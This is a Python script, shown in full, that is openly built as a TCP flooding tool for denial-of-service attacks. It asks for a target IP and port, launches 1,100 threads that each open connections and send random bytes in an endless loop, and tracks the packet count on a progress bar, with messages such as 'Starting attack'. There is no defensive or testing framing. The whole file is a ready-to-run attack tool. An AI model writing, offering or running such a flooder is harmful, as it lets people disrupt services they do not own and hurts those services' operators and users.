import socket
import threading
import random
from tqdm import tqdm
import time

target_ip = input("🎯 Enter the target IP: ")
target_port = int(input("🔌 Enter the target port: "))

total_threads = 1100

packets_sent = 0
lock = threading.Lock()


def attack():
    global packets_sent
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            data = random._urandom(1024)
            s.sendall(data)
            s.close()

            with lock:
                packets_sent += 1
        except:
            pass


print(f"\n💀 Starting attack on {target_ip}:{target_port}")
print(f"⚡ Threads: {total_threads}")
print(f"🔥 Press Ctrl+C to stop\n")

threads = []
for i in range(total_threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    threads.append(t)
    t.start()


try:
    with tqdm(total=None, desc="📡 Packets sent", unit="pkt") as pbar:
        last_count = 0
        while True:
            time.sleep(0.5)
            with lock:
                current = packets_sent
                pbar.update(current - last_count)
                last_count = current
except KeyboardInterrupt:
    print(f"\n\n🛑 Attack stopped!")
    print(f"📊 Total packets sent: {packets_sent}")
    print(f"💀 Exiting...")